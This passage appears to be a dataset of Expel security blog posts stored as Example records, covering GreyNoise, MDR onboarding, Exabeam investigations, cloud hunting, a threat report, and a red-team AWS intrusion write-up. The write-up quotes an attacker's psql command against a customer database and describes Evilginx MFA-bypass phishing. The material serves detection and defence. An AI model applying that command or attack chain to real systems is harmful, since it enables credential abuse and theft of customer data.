there isnt one. You can try and detect them, but your time is likely better spent building and detecting workflows to alert when something isnt right. Your best bet for detecting an issue before its known publicly? Build, deploy, and continuously improve alerting for behavioral patterns that suggest somethings amiss. (More on this in our annual cybersecurity trends report, Great eXpeltations 2022 .) In this specific Microsoft scenario, its important to have endpoint visibility into on-prem Microsoft Exchange Servers, and the ability to detect suspicious Exchange and IIS Worker processes. Were continuing to monitor this evolving situation, and will keep our customers updated as new information emerges.'}) (input_keys={'title'}),
  Example({'title': 'Evaluating GreyNoise: what you need to know and how it ...', 'url': 'https://expel.com/blog/evaluating-greynoise/', 'date': 'Feb 26, 2019', 'contents': 'Subscribe  EXPEL BLOG Evaluating GreyNoise: what you need to know and how it can help you Tips  6 MIN READ  DAN WHALEN AND PETER SILBERMAN  FEB 26, 2019  TAGS: Get technical / How to / Selecting tech / SOC / Tools Editors note: This is the first in a series of posts thatll tell you all about technologies we use in conjunction with Expel Workbench. At Expel, our SOC analysts get to work with lots of cool security technologies every day. Some are integrated directly into Expel Workbench  like Carbon Black , Darktrace and Duo , to name a few  because these are the products our customers already use, and we ingest activity events and alerts to monitor a customers environment. (By the way, if you want to see a longer list of our integration partners, go check out this page .) But we also use other technologies behind the scenes to make our analysts more efficient. Ultimately, were trying to apply technology to the alerts we pull from our integration partners so we can: 1) generate higher fidelity alerts and 2) give our analysts additional context when theyre triaging an alert. When we evaluate technologies that well potentially integrate into Expel Workbench, we typically ask ourselves four questions: Does this product or service allow us to improve a customers security posture? Does this technology offer new detection capabilities, improved response capabilities or provide our customers greater visibility into the work were doing? Will this product/service provide additional context that our SOC analysts would find useful? Will it allow us to shrink the time to evaluate a class of alerts? If a technology meets any of the criteria above, then well take it for a test drive to see if it can provide value to Expel Workbench, our analysts and our customers. Whats GreyNoise? GreyNoise has sensors all around the world that tell you what IPs are scanning the internet on a daily basis. When GreyNoise sensors detect scanning activity from an IP address, the service records the behaviors it observes from the IP along with related context about what it knows about that source. Why is this useful? This context gives you a global view of what an IP address has been up to historically (a perspective thats hard to come by otherwise). For example, threat researchers can use this data to look for spikes in scanning to identify possible new outbreaks of worms or other potential threats. Security practitioners can also use this data to filter out the noise in their network logs so they can focus their time on investigating legitimate threats actors and avoid wasting time chasing noise. Before we evaluated GreyNoise, we thought their data could help us in a couple of ways. First, we thought GreyNoises data might help us enrich the alerts and investigative leads we generate with additional context so our SOC analysts could shrink the time it takes to triage alerts. Second, we were interested in experimenting with how we could use GreyNoise data to detect threats. Although detection isnt our primary use case for GreyNoise, we wanted to explore some ideas that could help us identify noteworthy activity at our customers. How we evaluated GreyNoise (and what we learned) In order to evaluate GreyNoise and determine whether the tool would deliver the value we thought it might, we decided to run several different experiments using the service. Greynoise offers an API free of charge to so you can test various use cases and get a better understanding of how the technology can help your security operations. This is pretty awesome  how many other vendors are offering things for free to prove their value? We used this API, to test four use cases. For each use case below, well describe why we explored it, how we evaluated it and what we learned. As youre reading, think about how you might create different detection cases and then how youd evaluate them for your organization. Use case #1: Improving investigative context and triage time Why we tested this use case: As a managed security provider, were always exploring ways to make our analysts more efficient. One common pain point for security analysts everywhere is that Internet-wide scanning generates a lot of noise. Most dont require any actions. But reviewing them sucks up hours of time. We wanted to explore whether GreyNoise could help us quickly identify and filter out the noise so our analysts can focus their valuable time and energy on the alerts that matter. How we evaluated it: We took a sample of ~11,000 public IPs observed generating alerts across our customer base and requested GreyNoise context. This helped us determine how often the service would be able to tell us something valuable about an IP address. What we found: Our tests showed that GreyNoise was able to provide valuable context for 21 percent of the IP addresses we tested. This was a promising result for us! Speeding up the investigative process for a fifth of all alerts we review is a significant step in the right direction. As the GreyNoise service grows and collects more data we expect this percentage to increase. Use case #2: Detect when a customer IP address is flagged by GreyNoise Why we tested this detection: If GreyNoise identifies a customers IP as noise, it could be a security concern. For example, a noisy customer IP might mean theres a worm infection on a customer asset, a compromised IoT device or a vulnerability on a customer asset (think reflective DoS). How we evaluated it: We collected known IP space for a few of our customers by looking up their ASNs. We downloaded the daily noise from GreyNoise and compared the results against this IP space (~74,000 IPs). What we found: We found 14 customer IP addresses that were classified as noisy by GreyNoise. When we investigated, we found evidence of anomalous outbound SMB traffic that led to a customer notification. Use case #3: Detect customer hosts communicating with suspicious IP addresses Why we tested this detection: If a customer asset is communicating with an IP flagged by GreyNoise, it could represent an actionable security concern or else give us valuable context that will speed up our investigation. How we evaluated it: We took a sample of 29,652 destination IPs observed in customer environments and ran them against the GreyNoise API to retrieve context. What we found: We found that a significant portion of security alerts observed across our customer base (~ 25 percent) were going to a noisy IP address. When we reviewed these alerts, it was clear that the context GreyNoise provided would have accelerated our investigative process by, for example, differentiating targeted attacks from generic internet-wide scanning. Detection #4: Detect successful logins or data access sourced from internet scanners Why we tested this detection: If we saw successful logins from an IP address scanning the internet, it could indicate a users credentials were compromised or that some services were misconfigured. For example, weve seen organizations sometimes misconfigure cloud storage services like AWS S3 buckets or Microsoft Azure blobs. If we saw successful access to this storage from a scanner, it could indicate a misconfiguration that puts the customers data at risk. How we evaluated it: We took a sample of 6,310 alert source IPs observed in customer environments and ran them against the GreyNoise API to retrieve context. What we found: We didnt find many instances of successful logins or data access from noisy IPs (good news!). GreyNoise provided context for ~0.5 percent of the alerts we tested. This is also encouraging from a detection perspective. Following our testing, weve implemented rules to generate alerts when we observe a successful login or data access from a noisy IP address to highlight potentially compromised accounts or a misconfigured cloud storage service. Why we like GreyNoise When we see alerts sourced from IPs that GreyNoise classifies as noise, it helps us accurately prioritize them as non-targeted threats. Of course, this depends on the type of activity we observe and how the IPs are tagged. GreyNoise has helped us to create new rules that eliminate noise for specific low-value events that dont represent an actionable security concern. Additionally, the context it gives our analysts during alert triage can significantly reduce analysis time. Since integrating GreyNoise in Expel Workbench last summer, Expel has used the data to more efficiently triage alerts, detect interesting activity and weed out internet noise to focus on the alerts that really matter. Moving forward, we hope to continue research into creative new use cases and leverage some new GreyNoise features (hello GreyNoise query language!) for detection and research. Big shout out to two of our interns, Chris Vantine and Brandon Dossantos for their work in helping us evaluate GreyNoise. Your executable Interested in taking GreyNoise for a test drive? There are two easy ways to get started. First, head over to the GreyNoise Visualizer and try searching for a few IP addresses as you investigate alerts throughout the day. You might find (as our analysts did) that this context reduces the time it takes to review alerts. Second, if you are looking to integrate GreyNoise context into your analysis workflow, take a look at the GreyNoise API . This is a great way to automate lookups and eliminate extra steps in your analysis process. Give these ideas a try and see how GreyNoise stacks up. Wed love to hear about what you learned during your evaluation process. Drop us a note and share your thoughts.'}) (input_keys={'title'}),
  Example({'title': 'Evaluating MDR providers? Ask these questions about ...', 'url': 'https://expel.com/blog/evaluating-mdr-providers/', 'date': 'Feb 24, 2022', 'contents': 'Subscribe  EXPEL BLOG Evaluating MDR providers? Ask these questions about their onboarding process Security operations  5 MIN READ  LAURENCE WARRINER  FEB 24, 2022  TAGS: Cloud security / MDR / Tech tools Historically, managed detection and response (MDR) service providers have one major flaw thats overlooked  the level of effort required to turn on the service. In an industry where every minute counts, we dont have time to waste. Yet the onboarding process is so complicated you need project managers on both sides to manage the implementation. You have to navigate through pages and pages of complicated instructions to connect everything together. And it probably requires additional hardware, VMs with gigantic specs or another agent to deploy. The daily and weekly project status calls can last six months or longer. Its time consuming, expensive, and the level of effort is always underestimated. Sound familiar? When selecting any service provider, the initial setup, integration and activation should be an important factor in the decision-making process. Often, integrations take time and resources which lead to hidden expenses. We refuse to be that provider. Our development team vowed to make getting started with Expel as easy as joining a wireless network. The Expel Workbench makes onboarding simple by connecting tech using APIs (not agents). Our platform has an easy-to-follow interface and provides step-by-step guides for each technology. And were continuously improving the process to save you more time  even if its going from 30 down to five minutes. Weve learned that you really can have an easy button that gets services up and running in a matter of minutes with very little effort. So close that project plan and re-assign the project manager. Want to say goodbye to frustrating project plans and get a return on your investment immediately? You can. Just make sure that as youre evaluating MDR providers, you ask the right questions. And also make sure you get the right answers. We often talk about how were transparent here at Expel. This blog post is an example of that. In this post, well share our responses to the top questions you should ask MDR providers to help you better understand how theyll integrate with your tech and start monitoring. Can I onboard myself? Yes, please! Using the Expel Workbench, you can add, remove and edit devices whenever you wish. Although we have dedicated onboarding engineers ready to help with any support or questions, we purposely designed the Expel Workbench for easy self-onboarding. When can I start the onboarding process? Imagine you have a new TV provider. Youve agreed to start your contract with them on June 1. On June 1, they call you and ask, So, what channels do you want? Where should we ship the box? That would be annoying, right? You want to watch TV on the day you start paying, not wait until then to start the process of getting it up and running. We strongly believe in doing everything possible to provide service from day one. Thats why we give our customers all the information and access that they need well in advance. At Expel, our MDR customers receive: Step-by-step guides for each of your technologies. You can get all the details on the things you need to do on your side. Whether its user account creation, firewall changes or amending access right, youll find everything at support.expel.io  at any time. Expel Workbench access. We create your access accounts for the Expel Workbench so that you can start getting familiar with the interface and adding your team accounts, PagerDuty configurations, and any service desk integrations. Integration. As soon as you have Workbench access, you can start integrating your technologies. Not only does this allow you to do lean ahead work, but also allows our SOC team to start evaluating the signal, learning your environment and tuning alerts so that when we hit the switch on day one, you only get the alerts you really care about. Slack channel and support portal access. Talk to your Expel team whenever you need help. Initially, you might have questions about onboarding or navigating Workbench. Just send us a message in our portal or in Slack, and well be right there to help. What does the onboarding interface look like? Adding a cloud service into your Expel Workbench, like AWS CloudTrail, is simple with our automated wizard. Check out this short video to see how it works. And thats it! Youre now fully onboarded and were monitoring your environment. Can I add, edit or update integrations myself? All tech integrations are entirely in your control. You can easily add, remove and edit whenever you wish. This is not only beneficial for onboarding new techs, but we may also notify you automatically if credentials are not working or access permissions have been changed. These things can also be corrected right inside Workbench. Do you have documentation to help me do that? All of our onboarding support documentation is publicly available. We have a dedicated guide for each technology that details ( step-by-step ) the best way to configure your tech and how to add this information into your Workbench account. Having our integration guides publicly available allows Expel customers to understand any integration requirements ahead of time, so you can start planning and creating any user/API credentials in accordance with your internal change control requirements. What if I need help? We have a dedicated onboarding support team on hand to help you if you run into issues. We can help with both technical onboarding issues and can also verify the integrity of the data your tech is sending us. We also have automated health checks to ensure your device is sending us all of the glorious data our analysts love to ingest. When onboarding a new service of any kind, the process to get up and running is often an afterthought. When this happens, it causes stress and frustration for you and your team and typically starts the relationship with the vendor off on the wrong foot. Its important that you and your teams completely understand the onboarding requirements, both from a cost perspective (are there hidden costs because you need prerequisite equipment or services?) and a resource perspective. Your Expel engagement manager will make sure you understand the level of effort thats required from your teams behind the scenes. For example, how much time is needed to complete the connectivity requirements? And if the environment changes or permissions changes are needed, what are your internal change control requirements and how can your provider help to plan for these? As one of your critical partners in keeping your org safe, your MDR provider should help you understand how to best work with them and set you up for success before day one. What happens after onboarding? The Expel Workbench is designed and developed in-house with a big focus on user experience from conception. We work hard so that service activation is as simple and easy as possible. Remember: onboarding can and should be a painless process. As I mentioned, we provide simple step-by-step online guides for you to follow to configure your tech. And the output of these can easily be copied and pasted into secure fields within your Expel Workbench account. And we dont stop there. Were continually improving our integration technologies to include automated wizards between Expel Workbench and your cloud tech, making our integrations amazingly quick, easy, and seamless! Once onboarding is complete, we love getting feedback on how we can improve the experience. We invite our users to complete a quick, two-question survey after they finish onboarding. So, hows it going so far? Heres what some of our customers are saying: Want to learn more about how Expel does onboarding? Lets chat! (yes  well connect you with a real human. Although our bots are great conversationalists.)'}) (input_keys={'title'}),
  Example({'title': 'Evilginx-ing into the cloud: How we detected a red team ...', 'url': 'https://expel.com/blog/evilginx-into-cloud-detected-red-team-attack-in-aws/', 'date': 'Dec 1, 2020', 'contents': 'Subscribe  EXPEL BLOG Evilginx-ing into the cloud: How we detected a red team attack in AWS Security operations  6 MIN READ  ANTHONY RANDAZZO AND BRUCE POTTER  DEC 1, 2020  TAGS: Cloud security / MDR Its no secret that were fans of red team exercises here at Expel. What we love even more, though, is when we get to detect a red team attack in AWS Cloud. Get ready to nerd out with us as we walk you through a really interesting red team exercise we recently spotted in a customers AWS cloud environment. What is a red team engagement? First things first: Red team assessments are a great way to understand your detection and investigative capabilities, and stress test your Incident Response (IR) plan . There are also penetration tests. These are a bit different . Heres the best way to think about them, and understand the differences between the two: Penetration test: I need a pen test. This is the scope (boundaries). Tell me about all of the security holes within the scope of this assessment. In the meantime, Ill be watching our detections. Red team: This is your target. Try to get into my environment with no help and achieve that target, while also evading my defensive measures. At Expel, we find ourselves on the receiving end of a lot of penetration tests and red team engagements  in fact, weve even got our own playbook to help our customers plan them. (Yes, we regularly encourage our customers to put our Security Operations Center to the test.) For the duration of this blog post, well focus on what weve defined as a red team engagement. Can you red team in AWS? Before the cloud was a thing, red teams had a lot of similarities: The crafty attackers phished a user with a malicious document with a backdoor, grabbed some Microsoft credentials and pressed a big flashing keys to the kingdom button to achieve their objective. (Okay, there wasnt really a big flashing button, but sometimes it felt that way.) Fast forward to today: That model I just described is much different to execute in AWS. Most access is managed and provisioned through a third party identity and access manager (IdM/IAM) like Okta or OneLogin. An attacker would have to identify some exposed AWS access keys elsewhere or compromise a multi-factor authenticated (MFA) user in an IdM such as Okta. Thats exactly what one of our customers did recently when they brought in a red team to intrude into the customers AWS environment, causing our analysts to spring into action. Lets dive into what we uncovered during this red team exercise, what our team learned from it and how you can protect your own org from similar attacks. How we discovered a crafty phishing attempt in AWS cloud The first hint that something was wrong came in the form of one of our analysts discovering a login from an anonymous source to a customers AWS console. We immediately sprung into action, digging in to see if that user logged in from known proxies or end points previously. Expel Workbench lead alert But wait a second. Isnt this customers AWS access provisioned through Okta? Why didnt we get any Okta alerts? Shortly thereafter, an AmazonGuardDuty alert fired  those same access keys were being used from a python software development kit (SDK) rather than the AWS console and someone was enumerating those access key permissions. The TL;DR on all of that? Not good. We immediately escalated this as an incident to the customer to understand whether this series of events was expected. Observing the end goal of the red team Thats when we learned that we were just beginning a red team exercise, so we let the red teams attack play out to see what else wed uncover. Thats when things got interesting. First, we needed to understand how the red team got access to multiple AWS accounts when they were protected by Okta with MFA. Our theory was that these users were phished but we had to prove it. We dove into the Okta log data to look for anomalies. Anything that indicated something fishy (pun intended). We correlated with the DUO MFA logs and thats when we spotted some weirdness. It looked like the users session token may have been intercepted. All of these signs pointed to a crafty open source phishing kit like Evilginx . Now that we knew how the red team got in; what were they after? After a few observed instance credential compromises and privilege escalations through role assumptions, it seemed they found what they were looking for. They made an AWS API call  StartSession  to AWS Systems Manager (the AWS equivalent to Windows SCCM). Expel Workbench AWS GuardDuty alert A few minutes later, we had a CrowdStrike Falcon EDR alert for a python backdoor. They now had sudo Linux access to that EC2 server. Expel Workbench CrowdStrike alert At this point, it was time to make the response jump to the CrowdStrike Falcon event data to see what they were up to. After perusing the file system, they found local credentials to an AWS Redshift database. This was it. The crown jewels for that business: all of their customer data. /usr/bin/perl -w /usr/bin/psql -h crownjewels.customer.com -U username -c d If this had been a real attack, we wouldve immediately remediated the identified compromised Okta and AWS accounts in question. But when it comes to red team exercises, we think theyre not only a great way to pressure test our SOC, but they also give us an opportunity to learn about potential ways to help a customer improve their security. Where did we get our signal to detect this attack in AWS Cloud? After a red team exercise is complete, we always go back and ask ourselves the following question: What helped us get visibility that we can alert against in the future? In this case, the security signals that helped us detect and respond to the bad behavior in AWS Cloud were: Okta System logs: These logs contain all of the Okta IdM events to include the SSO activity to third party applications like AWS. DUO logs: MFA logs allowed us to spot that something was off as we correlated these with the Okta logs. Amazon CloudTrail: This helped us track ConsoleLogins and control plane activity, which is how we got our initial lead and tracked API activity from compromised AWS access keys. Amazon GuardDuty: GuardDuty was an essential tool that helped us look for and identify bad behavior in AWS. CrowdStrike: CrowdStrike helped us identify which specific cloud instances were compromised, and also helped us spot persistence. Endpoint visibility in cloud compute is often overlooked. If we notice gaps in security signal during a red team exercise, we have a conversation with the customer to see how we can potentially help them implement more or different signals so that our team has full visibility into their environment. How to protect your own org from these types of attacks With a sophisticated red team exercise, you should have some lessons that come out of it  both for your team of analysts and for your customer. Here are our takeaways from this exercise that you can use in your own org: Protect both API access as well as your local compute resources in the cloud. Use AWS controls like Service Control Policies to restrict API access across an AWS organization  this will help you manage who can do what in your environment and where theyre allowed to come from. The cloud is a double-edged sword: APIs are great because they let cloud users experiment and scale easily (theyre everything everybody loves about the cloud). But API access also means that attackers can more easily do a lot of bad things at once if they make their way into your environment.Protect that access and your local compute resources by restricting access and using the tools available to you. MFA isnt your silver bullet anymore. Spoiler alert: Weve said before that MFA wont protect you from attackers. While its still important to have, its not enough on its own. This particular attack underscores just how easy it is for an attacker to download a pretty sophisticated, automated attack from GitHub and then unleash it on your org in an effort to bypass MFA. As automated phishing packages like this become more common, every org will need to find more ways to protect themselves from man in the middle-type attacks. Oktas adaptive multi-factor authentication is a great preventative control to layer on that can help. The industry needs better signal to detect compromised cloud users, particularly those as a result of MitM attacks and detect it earlier in the attack sequence. Theres plenty of data in the existing log data to use for behavioral detections. Microsoft does a pretty reasonable job at trying to spot these with their Azure Identity Protection service . Want to know when we share more stories about stopping evil from lurking in AWS and thwarting sophisticated phishing attacks? Subscribe to our EXE blog to get new posts sent directly to your email.'}) (input_keys={'title'}),
  Example({'title': "Exabeam: an incident investigator's cheat code", 'url': 'https://expel.com/blog/exabeam-incident-investigators-cheat-code/', 'date': 'Feb 4, 2020', 'contents': 'Subscribe  EXPEL BLOG Exabeam: an incident investigators cheat code Security operations  6 MIN READ  ANTHONY RANDAZZO  FEB 4, 2020  TAGS: How to / Planning / SOC / Tools If you were to ask any SOC analyst their preferred tool of the trade, just about all of them would tell you how much they love using EDR (Endpoint Detection and Response) tools. Id say the same. Seventy percent of all compromises still originate at the endpoint , and EDR tools provide the endpoint detection and recording capabilities that security analysts need to tell the story of what happened. But in many cases, telling that story is time consuming because of the abundance of data recorded by the EDR. And EDR telemetry doesnt account for all the other security signal available to analysts across the network like cloud infrastructure and apps. All that signal is important to help an analyst figure out whats going on. For example, have you ever timelined Windows event logs using Excel? Yeah, me too. Its painful. EDR tools are great at finding evil but they arent necessarily your go-to source if you have to track a bad guy using a stolen credential across a 100K-node environment. Now, EDRs arent perfect. They wont detect everything. This is why that defense-in-depth strategy is so critical. So how can we get some insight into all security signals in a single, intelligible view? Well, many of our customers use Exabeam for exactly this purpose. Whats Exabeam? Exabeam Advanced Analytics detects threats by identifying high risk, anomalous user and entity activity. This happens by using machine learning to baseline normal activity for all users and entities in an environment. Once a baseline is available, the system automatically detects deviations compared to that baseline, the baseline of a peer group, and that of the organization as a wholeand assigns that activity a risk score. Each time a rule fires, the system accumulates a risk score for that user or entity session (roughly one day of activity). Once the risk score reaches a threshold, youll get a Notable User alert. From the alert, you can investigate the users session which contains all of the recorded events and triggered rules. Anomaly detection is often synonymous with snake oil in the security marketplace. Boy, was I wrong in this case. Exabeam stitches together all of our defense-in-depth security signals to provide a comprehensive view of what happened. Here are some examples of how Expel uses this insight to tell us things we didnt know and possibly wouldnt have known without a tool like Exabeam. Quick and dirty incident timelining when you need answers fast When we identify a security incident, its often a time consuming effort to collect all of the data necessary to put together a comprehensive timeline (Windows Event Logs, EDR events, authentication logs, etc.). To be honest, were going to do it anyway to ensure we dont miss anything. But we also strive to provide answers to our customers as quickly as possible. For example, Expel recently responded to an incident where an attacker was already on an endpoint. The attacker attempted to escalate privileges with PowerSploit. The customers EDR alerted on this activity but not the initial compromise. With this incident, wed ask the following general investigative questions and expand from here: What did the attacker do on this host? Did the attacker move laterally to any other hosts? Did the attacker have access to any other accounts? How did the attacker get into this environment? Traditional response scoping requires us to collect, parse, and review the EDR events and Windows Event Logs (assuming its a Windows compromise), and then pivot to other data sources once new leads are identified. Or we can simply review the user or entity timeline in Exabeam. Thanks to Exabeam, were already able to identify that the attacker gained initial access to the environment with compromised credentials through the Citrix Netscaler VPN. Fortunately for us responders, the user had little activity in the session so we easily attributed all of this activity back to the attacker. The authorized user wasnt on the network at the time to inject authorized user activity into the timeline. Moving down the timeline, we see the attacker accessed the published VDI from which wed received the original EDR alert. We also have the users web activity stitched into the Exabeam session and identified that the attacker moved staging tools on the VDI directly from Github. Lastly, we saw the actual EDR alerts stitched into the session timeline where the PowerSploit script was blocked from executing by the EDR. Without even looking at the EDR data, we answered all of our investigative questions with relative accuracy through Exabeams user session timeline. What did the attacker do on this host? He or she downloaded various post-exploitation tools to escalate privileges, which were blocked from executing by the EDR. Did the attacker move laterally to any other hosts? Given that we have the Windows Event logs stitched into the session, we didnt see any other access into the environment with this user account. Did the attacker have access to any other accounts? This question is a little trickier to answer because were only reviewing a single user session in Exabeam, but we can infer that the attacker was limited to this single account since he or she was isolated to a single provisioned VDI. How did the attacker get into this environment? We quickly discovered authenticated access into the Citrix environment via Netscaler VPN. This wouldve taken analysts hours to identify with manual response scoping through raw data. Visibility into things that didnt set off alarms in your EDR Identifying everything an attacker did in the timeframe of when the incident occurred is challenging enough for analysts and responders. In the previous example, we mentioned some of the nuances and lengthy processes involved in endpoint incident response. There are potentially millions of endpoint events occurring every day. This is a lot of data for humans to comb through to timeline an incident. What if an incident spans several days, weeks or even months? Heres an example: Expel responded to an intrusion first detected by an EDR due to an attackers deployment of a Cobalt Strike Beacon backdoor. Further analysis of the endpoint revealed the attacker performing reconnaissance of the network and Activity Directory (AD) environment with various open source tools. Reviewing this users sessions in Exabeam gave us lots of insightful data. All activity identified through host response from EDR data was validated in the Exabeam timeline: the EDR alert was preceded by various recon activities. Like the previous compromise example, this authorized user had limited network activity and the only previous session occurred 20 days earlier. Interestingly enough, that earlier session revealed the attacker to be active in the environment; he or she was performing the same recon activities. However, because the activities performed by the attacker during this previous session didnt warrant an accumulated risk score, Exabeam didnt generate an alert. More specifically, the attacker didnt execute the Beacon PowerShell activity that originally brought this to Expels attention, thus no EDR detection occurred for the earlier session. (More on this momentarily.) Exabeam proved to be highly valuable in identifying attacker dwell time in an environment  something that might not always be apparent with EDR technology. Keep in mind that EDR data retention is sometimes limited for endpoints and varies, ranging from storing up to a month of data to as little as several hours worth depending on the technology. Traditional IOC scoping, especially with compromised VPN/AD credentials, may not reveal an attacker. Putting it all together At the end of the day, Exabeam is still a machine learning (ML) technology. Like any ML technology it requires a little TLC, but if you take the time to tune it, you can get some really incredible benefits from it. Here are a few tricks weve learned about Exabeam: 1. Send the right data to Exabeam. Windows Event Logs, authentication logs (all of them!), web gateway logs and security events (EDR, AV, NSM, etc.) are a great start. Pro tip: anomaly detection of Windows process execution (Windows Event 4688) by users is awesome! Exabeam provides hundreds of data parsers natively to consume just about any data thats thrown at it. 2. Modify the rule risk scoring based on your organizations risk posture. The default risk scoring isnt a one-size-fits-all approach to measuring risk in an organization. Is insider data theft your orgs biggest concern? Give those rules a risk score increase. The process execution example below is one Id personally opt to boost. 3. Dont introduce new, high-volume data sets too quickly that greatly impact the data models (especially web gateway logs). Exabeam guides customers to allow the system learn on its own for a period of 45 days before enabling the rule set and leveraging it as a production tool. When you add a bunch of new data to an existing model, all of that new data becomes an anomaly. And you dont necessarily want that. If you find yourself in this position, pull back the risk scoring for those affected rules down to zero until the data models are able to catch up (or consult with your Exabeam partner for help). And here are some other points to consider if youre thinking of investing in a tool like Exabeam: 1. EDR isnt going to catch everything, particularly the anomalous use of credentials. Anomaly detection platforms like Exabeam can excel in this department. Keep in mind that UEBA platforms do require a certain amount of supervision to keep the false positives at bay, but youll have a better chance of surfacing up something that your traditional security tools might not catch. 2. Incident response is time consuming. Theres a lot of data to sift through to paint the full picture of what happened after an incident occurs. UEBA platforms like Exabeam do a rad job of helping stitch all of that user or entity context together to provide you with a comprehensive timeline of attacker activity.'}) (input_keys={'title'}),
  Example({'title': 'Expel Hunting: Now in the cloud', 'url': 'https://expel.com/blog/expel-hunting-now-in-the-cloud/', 'date': 'May 11, 2021', 'contents': 'Subscribe  EXPEL BLOG Expel Hunting: Now in the cloud Security operations  3 MIN READ  PETER SILBERMAN  MAY 11, 2021  TAGS: Cloud security / Company news / Hunting / MDR / Tech tools Great security strategy is made up of a multi-layered approach. It involves, but isnt limited to, detecting suspicious activity in real time, using proactive security controls and policies  and if you have the time (try not to laugh too hard here)  actively looking (or hunting) for threats. Hunting has traditionally looked for spots where an attacker slipped through without setting off alarm bells. But with the current tech transformation  adoption of SaaS, use of cloud infrastructure, introduction of new (and amazing) services to make developers and users more efficient  we think its time to expand on what hunting can find. Hunting gives you visibility into interesting things happening in your environment  like users modifying configurations or adding applications that can decrease your security posture along with activity that can indicate process breakdowns or genuinely suspicious activity. We think of these findings as insights. And these insights help our customers truly understand their environment and can keep bad stuff from happening. With more and more orgs using multiple cloud providers to store all the things, hunting (and the insights it produces) is an important part of any security strategy. Which is why were introducing new hunting techniques for our customers that focus on  you guessed it  cloud. Whats new Expel Hunting now offers coverage in Amazon Web Services (AWS) and Microsoft Azure to help find blind spots. Were newly armed with a set of targeted cloud hunts, focused on key pieces of information you may be missing. Transparency  We lay our cards on the table so you know exactly what were doing for you. For every hunt, well show you the work that went into it. Well tell you our methodology  mapped back to the MITRE ATT&amp;CK framework, the data we pulled, what tech we used and the outcomes. Its important for you to see what were doing and why  so you can learn too. Expanded scope  Were constantly adding to our library of hunt techniques based on activity we see among our clients. Which is why weve added new hunts focused on cloud environments and applications. Insights  While were running through your logs, well tell you what normal looks like for you and surface activity that something does not seem right. These findings provide visibility into your environment that you didnt know about otherwise. You can put these insights into action and better secure your environment. What youll get with Expel Hunting More value out of your existing tech No need to go out and buy more stuff. Well hunt across your environment with the tools youve already invested in. The more we connect to, the more we can hunt for. Breaking down these silos helps make your team and existing investments stronger. Uncover more than threats We hunt beyond what is malicious. As we comb through your data, we flag strange activity that falls outside of normal like misconfigurations in your infrastructure that could be increasing your cloud costs. With expanded insight into your environment, youll get an in-depth analysis of your logs and shine light on anomalous activity that would not be found through detection. Hunt techniques aligned to your unique risks Do you want to hunt in the cloud, in SaaS apps or on-prem? You got it. We take a close look at your environment and let you know exactly what hunting techniques we can use and the types of things were able to find. More sleep Dont lose sleep after reading the latest Reddit article that leaves you wondering: How do I know were not affected? By working with Expel, youll have more confidence when the latest threat strikes, knowing that were protecting you against emerging threats and improving your security posture. (We cant, however, help with sleep problems related to noisy neighbors, pets, children with an inexplicable abundance of energy  you get the idea.) Ready to go on the hunt? We sure are. If youre curious as to what others think about Expel Hunting, take a look at the Q1 2021 Forrester Wave Report , where Expel was ranked five out of five when it comes to threat hunting. Let us help so that your team can get back to focusing on the highest value security work  and get you back to doing what you love. Learn more about Expel Hunting'}) (input_keys={'title'}),
  Example({'title': 'Expel Quarterly Threat Report Q3: Top 5 takeaways', 'url': 'https://expel.com/blog/expel-quarterly-threat-report-q3-top-5-takeaways/', 'date': 'Nov 16, 2022', 'contents': 'Subscribe  EXPEL BLOG Expel Quarterly Threat Report Q3: Top 5 takeaways Security operations  3 MIN READ  BEN BRIGIDA  NOV 16, 2022  TAGS: Cloud security / MDR / Tech tools Hi, and welcomeits Quarterly Threat Report (QTR) time. Our security operations center (SOC) sees hundreds of alerts each day, and the QTR series (this is the third installment) provides data and insight on what they are, how they work, how to spot them, what to do if you find them, as well as advice you can use to safeguard your organization. The findings draw on our investigations into alerts, email submissions, and threat hunting leads from July 1 to September 30, 2022. We analyzed incidents across our customer base, spanning organizations of various shapes, sizes, and industries, and in the process, we distilled patterns and trends to help guide strategic decision-making and operational processes for your team. We employed a combination of time series analysis, statistics, customer input, and analyst instinct to identify key insights. Our goal: by sharing how attackers got in (or tried to) and how we stopped them, well translate our experiences into security strategies your organization can put into play today . Here are our top findings for the quarter. 1: Identity is still the new endpoint , and it shows no signs of slowing down. Identity-based attacks, which include credential theft, credential abuse, and long-term access key theft, accounted for nearly 60% of all incidents our SOC fielded in Q3. This is up three percentage points compared to Q2. Business email compromise (BECunauthorized access into email apps) and business application compromise (BACunauthorized access into application data) combined for 55% of all incidents, an increase of four percentage points from Q2. Identity-based attacks in popular cloud environments like Amazon Web Services (AWS) decreased slightly (by two percentage points, for 3% of the total). An interesting data point: 100% of BEC incidents occurred in Microsoft 365 (formerly Office 365) for the second quarter in a row. (Were pretty sure this is the result of attackers preparing for Microsofts long-awaited disabling of Basic Auth for Exchange Online , which went into effect on October 1.) 2: Users increasingly let attackers in by approving fraudulent MFA pushes for BAC. Only about half the BAC incidents our SOC encountered resulted in the attacker successfully accessing the account. The other half was stopped by multi-factor authentication (MFA) or conditional access policies. The frustrating part is that MFA and conditional access were configured for more than 80% of the cases where the attackers were successful . Ideally, none of these hacks should have succeeded. However, the attacker tricked legitimate users into satisfying the MFA request by hitting them with a barrage of MFA requests, and eventually they accepted one. This number is up dramatically from last quarter, when only 14% of successful compromises came from repeated push notifications. The takeaway? To stop MFA push notification fatigue attacks, organizations can disable them in favor of a PIN of a Fast Identity Online (FIDO) compliant solution. If thats unrealistic, control push notifications using number matchinga setting that requires the user to enter numbers from the identity platform into their MFA app to approve the authentication request. 3: Attackers use IPs geolocated in the U.S. when targeting U.S.-based organizations. If youre in the U.S. and think you only need to closely monitor for IPs outside the country attempting to access your environmentheres your wake-up call. Almost half of the BEC attempts and successful BEC compromises we see originate from U.S.-based IP addresses. Also, all the authentication attempts originating from the U.S. came from an IP associated with a VPN or hosting provider. This tactic increases a hackers chances of bypassing conditional access policies for source countries that either force the user into an MFA challenge or even flat out block the login. If attackers gain access to the account by harvesting user credentials instead of brute force or another method, they can also harvest the users IP (and therefore geolocation). For authentications, its vital to have alerting based on the IP organization as well as VPN enrichment services. 4: Ransomware threat groups and their affiliates have abandoned visual basic for application (VBA) macros and Excel 4.0 macros in favor of zipped Javascript or ISO files to infiltrate Windows-based environments. The top attack vectors used by ransomware groups to gain initial entry in Q3 were: Zipped JavaScript files (46% all pre-ransomware incidents) Zipped ISO files (26%) Removable media (10%) Excel 4.0 macros (8%) In Q2, our SOC noted the trend of threat actors using zipped JavaScript and ISO files to deliver malware to gain initial access. Way back in Q1 ( when Microsoft announced its plans to disable Excel 4.0 macros by default in Q3 ), a macro-enabled Microsoft Word document 